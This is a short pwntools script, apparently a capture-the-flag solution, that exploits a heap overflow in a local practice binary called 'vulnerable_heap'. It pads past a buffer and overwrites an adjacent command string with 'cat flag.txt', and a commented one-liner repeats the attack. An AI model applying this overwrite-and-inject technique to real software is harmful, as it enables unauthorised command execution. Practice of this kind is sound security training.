from pwn import *
from pwnlib.tubes.process import PTY

context.log_level = 'debug'

p = process('./vulnerable_heap/ELF_64/vulnerable_heap', stdin=PTY, stdout=PTY)

payload  = b"\x00"            # makes arg look empty to checkArg/strcat
payload += b"A" * (0x30 - 1)  # total 0x30 bytes to reach cmd
payload += b"cat flag.txt\x00"  # overwrite cmd cleanly

p.sendline(payload)
print(p.recvall().decode(errors="replace"))



##
#python3 -c "print(' '*0x30 + 'cat flag.txt')" | ./ELF_64/vulnerable_heap
##